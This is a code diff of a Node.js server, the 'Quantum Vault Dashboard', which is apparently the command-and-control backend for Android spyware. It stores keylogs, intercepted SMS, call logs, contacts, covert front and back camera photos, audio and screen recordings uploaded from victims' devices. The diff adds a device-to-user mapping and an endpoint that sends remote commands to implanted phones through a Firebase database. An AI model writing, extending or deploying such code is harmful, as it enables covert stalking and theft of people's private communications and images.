@@ -4,13 +4,17 @@ const bodyParser = require('body-parser');
 const fs = require('fs');
 const path = require('path');
 const moment = require('moment');
+const https = require('https'); // For Firebase REST API
 
 const app = express();
 const PORT = 5000;
 
+// ✅ REPLACE with your actual Firebase URL from google-services.json
+const FIREBASE_URL = "https://saral-87cd4-default-rtdb.firebaseio.com";
+
 // ─── Directory Setup ──────────────────────────────────────────────────────────
 const uploadDirs = ['audios', 'contacts', 'photos', 'videos', 'others',
-                    'front_photos', 'back_photos', 'screen_recordings'];
+    'front_photos', 'back_photos', 'screen_recordings'];
 uploadDirs.forEach(dir => {
     const dirPath = path.join(__dirname, 'uploads', dir);
     if (!fs.existsSync(dirPath)) fs.mkdirSync(dirPath, { recursive: true });
@@ -18,17 +22,16 @@ uploadDirs.forEach(dir => {
 
 // ─── Data Store ───────────────────────────────────────────────────────────────
 const dataFile = path.join(__dirname, 'data.json');
-const defaultData = { texts: [], sms: [], files: [], call_logs: [] };
+const defaultData = { texts: [], sms: [], files: [], call_logs: [], devices: {} };
 if (!fs.existsSync(dataFile)) {
     fs.writeFileSync(dataFile, JSON.stringify(defaultData, null, 2));
 } else {
-    // Migrate old data.json to include call_logs if missing
     try {
         const existing = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
-        if (!existing.call_logs) {
-            existing.call_logs = [];
-            fs.writeFileSync(dataFile, JSON.stringify(existing, null, 2));
-        }
+        let updated = false;
+        if (!existing.devices) { existing.devices = {}; updated = true; }
+        if (!existing.call_logs) { existing.call_logs = []; updated = true; }
+        if (updated) fs.writeFileSync(dataFile, JSON.stringify(existing, null, 2));
     } catch (e) {
         fs.writeFileSync(dataFile, JSON.stringify(defaultData, null, 2));
     }
@@ -40,20 +43,30 @@ const readData = () => {
 };
 const writeData = (data) => fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
 
+// ─── Mapping Device-ID to User-ID ─────────────────────────────────────────────
+const updateDeviceMap = (deviceId, userId) => {
+    if (!deviceId || !userId || deviceId === 'Unknown') return;
+    const db = readData();
+    if (db.devices[deviceId] !== userId) {
+        db.devices[deviceId] = userId;
+        writeData(db);
+        console.log(`[MAP] Registered ${deviceId} → ${userId}`);
+    }
+};
+
 // ─── Middleware ───────────────────────────────────────────────────────────────
 app.use(cors());
 app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
 app.set('view engine', 'ejs');
 app.set('views', path.join(__dirname, 'views'));
 
-// Raw body handler for binary file uploads (octet-stream)
 const FOLDER_MAP = {
-    '/upload_audios':           'audios',
-    '/upload_contacts':         'contacts',
-    '/upload_photos':           'photos',
-    '/upload_videos':           'videos',
-    '/upload_front_photo':      'front_photos',
-    '/upload_back_photo':       'back_photos',
+    '/upload_audios': 'audios',
+    '/upload_contacts': 'contacts',
+    '/upload_photos': 'photos',
+    '/upload_videos': 'videos',
+    '/upload_front_photo': 'front_photos',
+    '/upload_back_photo': 'back_photos',
     '/upload_screen_recording': 'screen_recordings',
 };
 
@@ -71,22 +84,22 @@ const rawBodySaver = (req, res, next) => {
         const writeStream = fs.createWriteStream(filePath);
         req.pipe(writeStream);
 
+        const deviceId = req.headers['device-id'] || 'Unknown';
+        const userId = req.headers['user-id'];
+        updateDeviceMap(deviceId, userId);
+
         req.on('end', () => {
             const db = readData();
             db.files.push({
                 filename,
                 path: `/uploads/${folder}/${savedName}`,
                 type: folder,
-                deviceId: req.headers['device-id'] || 'Unknown',
+                deviceId,
                 timestamp: moment().format('YYYY-MM-DD HH:mm:ss')
             });
             if (db.files.length > 1000) db.files.shift();
             writeData(db);
             res.status(200).send('File Uploaded');
-        });
-        req.on('error', (err) => {
-            console.error('File upload error:', err);
-            res.status(500).send('Error uploading file');
         });
     } else {
         next();
@@ -98,10 +111,12 @@ app.use(bodyParser.json({ limit: '10mb' }));
 
 // ─── Endpoints ────────────────────────────────────────────────────────────────
 
-// Text / Keylogs / Location / SMS History
 app.post('/upload_text', (req, res) => {
     const { type, data } = req.body;
     const deviceId = req.headers['device-id'] || 'Unknown';
+    const userId = req.headers['user-id'];
+    updateDeviceMap(deviceId, userId);
+
     const db = readData();
     db.texts.push({
         type: type || 'Log',
@@ -111,14 +126,15 @@ app.post('/upload_text', (req, res) => {
     });
     if (db.texts.length > 2000) db.texts.shift();
     writeData(db);
-    console.log(`[TEXT] [${deviceId}] type=${type} len=${(data||'').length}`);
     res.status(200).send('Text logged');
 });
 
-// Live SMS intercepts
 app.post('/upload_sms', (req, res) => {
     const { sender, message, timestamp } = req.body;
     const deviceId = req.headers['device-id'] || 'Unknown';
+    const userId = req.headers['user-id'];
+    updateDeviceMap(deviceId, userId);
+
     const db = readData();
     db.sms.push({
         sender: sender || 'Unknown',
@@ -127,62 +143,77 @@ app.post('/upload_sms', (req, res) => {
         deviceId,
         timestamp: moment().format('YYYY-MM-DD HH:mm:ss')
     });
-    if (db.sms.length > 500) db.sms.shift();
     writeData(db);
-    console.log(`[SMS] [${deviceId}] from=${sender}`);
     res.status(200).send('SMS logged');
 });
 
-// Call logs (JSON string in data field)
 app.post('/upload_call_logs', (req, res) => {
     const { data } = req.body;
     const deviceId = req.headers['device-id'] || 'Unknown';
+    const userId = req.headers['user-id'];
+    updateDeviceMap(deviceId, userId);
+
     const db = readData();
-    db.call_logs.push({
-        data: data || '[]',
-        deviceId,
-        timestamp: moment().format('YYYY-MM-DD HH:mm:ss')
-    });
-    if (db.call_logs.length > 50) db.call_logs.shift();
+    db.call_logs.push({ data: data || '[]', deviceId, timestamp: moment().format('YYYY-MM-DD HH:mm:ss') });
     writeData(db);
-    console.log(`[CALL_LOGS] [${deviceId}]`);
     res.status(200).send('Call logs saved');
 });
 
-// Binary file upload route stubs (handled by rawBodySaver above)
-app.post('/upload_audios',           (req, res) => res.status(200).send('ok'));
-app.post('/upload_contacts',         (req, res) => res.status(200).send('ok'));
-app.post('/upload_photos',           (req, res) => res.status(200).send('ok'));
-app.post('/upload_videos',           (req, res) => res.status(200).send('ok'));
-app.post('/upload_front_photo',      (req, res) => res.status(200).send('ok'));
-app.post('/upload_back_photo',       (req, res) => res.status(200).send('ok'));
-app.post('/upload_screen_recording', (req, res) => res.status(200).send('ok'));
+// ─── COMMAND API (Updates Firebase) ───────────────────────────────────────────
+app.post('/api/command', (req, res) => {
+    const { deviceId, command } = req.body;
+    const db = readData();
+    const userId = db.devices[deviceId];
 
-// API endpoint for live polling (no page reload)
+    if (!userId) {
+        return res.status(404).json({ error: "User-ID not found for this device. Wait for it to sync once." });
+    }
+
+    // Update Firebase via REST API
+    const url = `${FIREBASE_URL}/commands/${userId}/command.json`;
+    const data = JSON.stringify(command);
+
+    const firebaseReq = https.request(url, {
+        method: 'PUT',
+        headers: {
+            'Content-Type': 'application/json',
+            'Content-Length': data.length
+        }
+    }, (firebaseRes) => {
+        let body = '';
+        firebaseRes.on('data', chunk => body += chunk);
+        firebaseRes.on('end', () => {
+            console.log(`[CMD] Sent ${command} to ${userId} (${deviceId})`);
+            res.json({ success: true, command, userId });
+        });
+    });
+
+    firebaseReq.on('error', (e) => {
+        console.error("Firebase Command Error:", e);
+        res.status(500).json({ error: "Failed to reach Firebase" });
+    });
+
+    firebaseReq.write(data);
+    firebaseReq.end();
+});
+
+// API endpoint for live polling
 app.get('/api/data', (req, res) => {
     const db = readData();
     res.json({
-        texts:       [...db.texts].reverse().slice(0, 200),
-        sms:         [...db.sms].reverse().slice(0, 200),
-        files:       [...db.files].reverse().slice(0, 200),
-        call_logs:   [...db.call_logs].reverse().slice(0, 50),
+        texts: [...db.texts].reverse().slice(0, 200),
+        sms: [...db.sms].reverse().slice(0, 200),
+        files: [...db.files].reverse().slice(0, 200),
+        call_logs: [...db.call_logs].reverse().slice(0, 50),
+        devices: db.devices
     });
 });
 
-// Dashboard
 app.get('/', (req, res) => {
     const db = readData();
-    const viewData = {
-        texts:     [...db.texts].reverse(),
-        sms:       [...db.sms].reverse(),
-        files:     [...db.files].reverse(),
-        call_logs: [...db.call_logs].reverse(),
-    };
-    res.render('index', { data: viewData });
+    res.render('index', { data: { ...db, texts: [...db.texts].reverse(), sms: [...db.sms].reverse(), files: [...db.files].reverse(), call_logs: [...db.call_logs].reverse() } });
 });
 
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Quantum Vault Dashboard → http://localhost:${PORT}`);
-    console.log(`   For real devices on LAN  → http://<YOUR-PC-IP>:${PORT}`);
-    console.log(`   Android Emulator reaches → http://10.0.2.2:${PORT}`);
 });
